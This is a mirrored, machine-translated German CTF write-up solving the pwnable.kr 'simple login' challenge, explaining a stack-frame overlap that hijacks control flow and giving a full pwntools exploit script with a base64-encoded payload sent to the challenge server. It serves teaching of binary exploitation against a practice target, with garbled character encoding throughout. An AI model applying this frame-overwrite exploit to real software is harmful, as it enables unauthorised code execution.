<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üõãÔ∏è ü§πüèø üå°Ô∏è Probleml√∂sung mit pwnable.kr 24 - einfaches Login. Stapelrahmen√ºberlagerung üëèüèæ ü§µüèº ‚ñ™Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel l√∂sen wir die 24. Aufgabe auf der Website pwnable.kr und erfahren, wie Sie den Stapelrahmen stapeln. 

 Organisationsinformationen  ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Probleml√∂sung mit pwnable.kr 24 - einfaches Login. Stapelrahmen√ºberlagerung</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/468761/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="Bild"></div><br>  In diesem Artikel l√∂sen wir die 24. Aufgabe auf der Website <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pwnable.kr</a> und erfahren, wie Sie den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Stapelrahmen</a> stapeln. <br><br><div class="spoiler">  <b class="spoiler_title">Organisationsinformationen</b> <div class="spoiler_text">  Speziell f√ºr diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit entwickeln m√∂chten, werde ich √ºber die folgenden Kategorien schreiben und sprechen: <br><br><ul><li>  PWN; </li><li>  Kryptographie (Krypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Dar√ºber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchf√ºhrung von Pentests und Schreiben von Exploits teilen. <br><a name="habracut"></a><br>  Damit Sie sich √ºber neue Artikel, Software und andere Informationen informieren k√∂nnen, habe ich <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">in Telegram</a> einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Kanal</a> und eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gruppe eingerichtet, um alle Probleme</a> im Bereich ICD <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zu diskutieren</a> .  Au√üerdem werde ich Ihre pers√∂nlichen Anfragen, Fragen, Vorschl√§ge und Empfehlungen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pers√∂nlich</a> pr√ºfen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">und alle beantworten</a> . <br><cut></cut><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments √ºbernimmt keine Verantwortung f√ºr Sch√§den, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die durch das Studium dieses Dokuments erworben wurden. <br></div></div><br><h2>  Einfache Login-Job-L√∂sung </h2><br>  Wir setzen den zweiten Abschnitt fort.  Ich werde gleich sagen, dass es schwieriger ist als das erste und wir nicht mit dem Quellcode der Anwendungen versorgt werden.  Vergessen Sie nicht die Diskussion <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> .  Fangen wir an. <br><br>  Klicken Sie auf das Symbol mit dem einfachen Login der Signatur.  Wir erhalten die Adresse und den Anschluss f√ºr die Verbindung sowie das Programm selbst. <br><br><img src="https://habrastorage.org/webt/1g/5k/y3/1g5ky3q7oclvpdrkmbmuoojfew0.png" alt="Bild"><br><br>  Laden Sie alles herunter, was sie uns geben, √ºberpr√ºfen Sie die Bin√§rdatei. <br><br><img src="https://habrastorage.org/webt/d4/ik/ay/d4ikay9hapwq7e8dofp4upu7xuw.png" alt="Bild"><br><br>  Dies ist ein 32-Bit-Elf mit installiertem kanarischen und nicht ausf√ºhrbaren Stapel.  Wir dekompilieren in IDA Pro. <br><br><img src="https://habrastorage.org/webt/z8/9y/3t/z89y3thmraeji37baleexeeo7ne.png" alt="Bild"><br><br>  Im Programm werden Benutzerdaten von base64 dekodiert.  Die Variable v7 speichert die L√§nge der decodierten Zeichenfolge.  Ferner wird v7 mit 12 verglichen. Wenn die Pr√ºfung bestanden wird, wird die decodierte Zeichenfolge in die Eingabevariable kopiert, und dann wird die Auth-Funktion aufgerufen, in die die L√§nge der decodierten Zeichenfolge als Parameter √ºbergeben wird.  Und wenn wir die Authentifizierung bestehen, wird die richtige Funktion aufgerufen.  Schauen wir uns die Auth-Funktion an. <br><br><img src="https://habrastorage.org/webt/zt/kq/uh/ztkquhhsdyvhddmp6shn1hdunik.png" alt="Bild"><br><br>  Es sieht aus wie ein Puffer√ºberlauf.  Schauen Sie sich den Stapel an. <br><br><img src="https://habrastorage.org/webt/zw/6r/cd/zw6rcd0n-nswgdojdpo1qnbgjrg.png" alt="Bild"><br><br>  Nein.  Wir k√∂nnen den Puffer nicht √ºberlaufen lassen, da dies mehr als 12 Bytes erfordert.  Interessant sind die Adressen, an denen der Wert der Variablen gespeichert ist, insbesondere die v4-Variable, in die kopiert wird. <br><br><img src="https://habrastorage.org/webt/yf/r1/i0/yfr1i0s9vbec-3wrrkzibmcxrio.png" alt="Bild"><br><br>  Dies ist die Adresse [ESP + 32].  Schauen Sie sich den Code daf√ºr in zerlegter Form an. <br><br><img src="https://habrastorage.org/webt/ca/gq/kl/cagqkltbv-hsu6anyeqqgfqy7b0.png" alt="Bild"><br><br>  Die folgenden Anweisungen sind erforderlich, um den Stapelrahmen zu speichern. <br> <code>push ebp <br> mov ebp, esp</code> <br>  Verwenden Sie die Anweisung Leave, um den Stapel wiederherzustellen.  Womit wir die inversen Operationen durchf√ºhren. <br><br><img src="https://habrastorage.org/webt/pb/tq/l1/pbtql14yyojqyn1_hd7eshfzgl0.png" alt="Bild"><br><br>  Am interessantesten ist die dritte Anweisung, <code>sub esp, 28h</code> . <br><br>  Somit tritt eine √úberlappung auf: esp nimmt um 40 ab, und die v2-Variable befindet sich bei esp + 32 und ben√∂tigt 12 Bytes.  Das hei√üt, nach dem Verschieben des Werts von esp nach ebp wird die Adresse der letzten vier Bytes der Variablen v2 in ebp gespeichert.  Wenn die Leave- und Retn-Anweisungen ausgef√ºhrt werden, befinden sich die letzten vier Bytes der v2-Variablen jetzt im oberen Frame des Stapels. <br><br>  Lassen Sie uns die Eingabezeile QUFBQUFBQUFCQkJC √ºberpr√ºfen und angeben. <br><br><img src="https://habrastorage.org/webt/mz/cx/0v/mzcx0vt54mbmppksh9q1j4yeg-s.png" alt="Bild"><br><br>  Wenn unsere Annahme richtig ist, ist nach dem Ausf√ºhren von retn in der Auth-Funktion die Adresse "BBBB" die Spitze des Stapels. <br><br><img src="https://habrastorage.org/webt/px/-n/tj/px-ntjgjb6pvnbtpxgofh-cwf78.png" alt="Bild"><br><br>  F√ºhren Sie nun Urlaub aus. <br><br><img src="https://habrastorage.org/webt/fs/pl/kv/fsplkvdn9spk6zbi6laol6fkb5g.png" alt="Bild"><br><br>  Es gibt "BBBB" in EBP und jetzt, nachdem Urlaub in der Hauptfunktion main ausgef√ºhrt wurde, st√ºrzt das Programm ab.  Somit k√∂nnen wir vor der Adresse der Oberseite des Stapels stehen, an der sich die Adresse befindet, zu der wir gehen m√∂chten.  Dann wird die Last wie folgt aussehen: 4 beliebige Bytes + Adresse, an die wir gehen + Adresse zum Anfang der Ladung. <br><br>  Schreiben Sie zun√§chst eine Vorlage. <br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> base64 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * r = remote(<span class="hljs-string"><span class="hljs-string">'pwnable.kr'</span></span>, <span class="hljs-number"><span class="hljs-number">9003</span></span>) r.recv() r.interactive()</code> </pre> <br>  Jetzt finden wir die Adresse heraus, an die wir gehen m√∂chten - dies ist 0x8049284 innerhalb der richtigen Funktion. <br><br><img src="https://habrastorage.org/webt/gz/y_/qk/gzy_qktjqg7ewvanmiugy1kqmd4.png" alt="Bild"><br><br>  Diese Adresse wird der zweite Teil unserer Ladung sein.  Der dritte Teil der Last ist die Adresse der Eingangsvariablen (Ladeadresse). <br><br><img src="https://habrastorage.org/webt/sg/xt/v-/sgxtv-dqhi1eldkfupoizg3mje8.png" alt="Bild"><br><br>  Wir setzen die Last im Code zusammen.  Vergessen Sie nicht, in base64 zu codieren: <br><pre> <code class="python hljs">payload = <span class="hljs-string"><span class="hljs-string">"A"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span> + p32(<span class="hljs-number"><span class="hljs-number">0x8049284</span></span>) + p32(<span class="hljs-number"><span class="hljs-number">0x811EB40</span></span>) payload = b64encode(payload)</code> </pre><br>  Vollst√§ndiger Code. <br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> base64 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * r = remote(<span class="hljs-string"><span class="hljs-string">'pwnable.kr'</span></span>, <span class="hljs-number"><span class="hljs-number">9003</span></span>) r.recv() payload = <span class="hljs-string"><span class="hljs-string">"A"</span></span>*<span class="hljs-number"><span class="hljs-number">4</span></span> + p32(<span class="hljs-number"><span class="hljs-number">0x8049284</span></span>) + p32(<span class="hljs-number"><span class="hljs-number">0x811EB40</span></span>) payload = b64encode(payload) r.send(payload+<span class="hljs-string"><span class="hljs-string">"\n"</span></span>) r.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/ge/ey/wy/geeywypjyxqnqsi_lfbb7sfbn7i.png" alt="Bild"><br><br>  Und hol dir deine Punkte.  Ehrlich gesagt war diese Aufgabe f√ºr mich nicht sehr einfach. <br><br><img src="https://habrastorage.org/webt/ey/uc/i8/eyuci8f_4bpue1yyfbwwlqk0eks.png" alt="Bild"><br><br>  Und wir fahren fort: im n√§chsten Artikel - Forensik.  Sie k√∂nnen sich uns <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">per Telegramm anschlie√üen</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de468761/">https://habr.com/ru/post/de468761/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de468747/index.html">Wie ich den Sommer auf VK verbracht habe</a></li>
<li><a href="../de468749/index.html">Android LiveData-Ereignisse</a></li>
<li><a href="../de468753/index.html">Farbenblind - Freund des Menschen (Gesundheitsministerium ist nicht richtig)</a></li>
<li><a href="../de468757/index.html">MySQL-Verbindung nach Fehler 1040: zu viele Verbindungen</a></li>
<li><a href="../de468759/index.html">√úber trivial_abi in Clang</a></li>
<li><a href="../de468765/index.html">Die Wichtigkeit der Best√§tigung von Steuerbefehlen am Beispiel von Delimobile</a></li>
<li><a href="../de468767/index.html">Holzspielzeug, Teil zwei - 1986-1988</a></li>
<li><a href="../de468769/index.html">Xavier Noria auf Rails 6, Beratung und mehr</a></li>
<li><a href="../de468773/index.html">Das indische Energieunternehmen NTPC baut einen 5.000-Megawatt-Solarpark</a></li>
<li><a href="../de468775/index.html">KI-Vormachtstellung: Leela Chess. Oder dar√ºber, wie ein vollst√§ndig offenes neuronales Netzwerk gewonnen hat</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>